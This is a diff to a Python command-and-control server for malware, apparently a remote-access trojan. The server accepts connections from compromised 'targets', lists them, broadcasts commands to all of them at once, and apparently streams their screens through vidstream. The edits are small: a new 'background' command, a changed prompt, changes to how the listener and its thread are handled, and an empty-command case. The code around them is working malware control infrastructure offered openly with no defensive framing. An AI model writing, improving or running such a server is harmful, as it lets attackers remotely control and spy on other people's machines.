@@ -10,6 +10,7 @@ import help
 import os
 from vidstream import StreamingServer
 import threading
+import sys
 
 # Connection data
 HOST = '192.168.1.110'
@@ -110,6 +111,9 @@ def targetComs(target, ip):
         if prompt == 'exit': # Exit the loop if the exit message is sent
             break
 
+        elif command == 'background':
+            break
+
         elif prompt == 'clear': # Clear the screen
             os.system('clear')
         
@@ -163,7 +167,7 @@ sock.bind((HOST, PORT))
 
 print(termcolor.colored(f'[+] Server listening on port [{PORT}] for incoming connections', 'green'))
 
-sock.listen(5)
+sock.listen()
 
 t1 = threading.Thread(target=acceptConnections)
 t1.start()
@@ -172,7 +176,7 @@ print(termcolor.colored('[+] Waiting for incoming connections...'))
 
 while True:
 
-    command = input('[+++] Command & Control Center: ')
+    command = input('[+] Command & Control Center: ')
 
     if command == 'list-targets': # Print all the current targets connected to the network
 
@@ -215,7 +219,6 @@ while True:
 
             sock.close()
             stopFlag = True
-            t1.join()
 
             print(termcolor.colored(f'[+] Socket closed. Exiting...', 'yellow'))
             break
@@ -230,6 +233,9 @@ while True:
         
         targets.remove(Target)
         ips.remove(ip)
+    
+    elif command == '':
+        pass
 
     elif command.startswith('broadcast'): # Sends the specified command to all targets in the network
         x = len(targets)
@@ -249,3 +255,4 @@ while True:
     else:
         print(termcolor.colored(f"[!!!] Unable to find command '{str(command)}'", 'red'))
 
+t1.join()
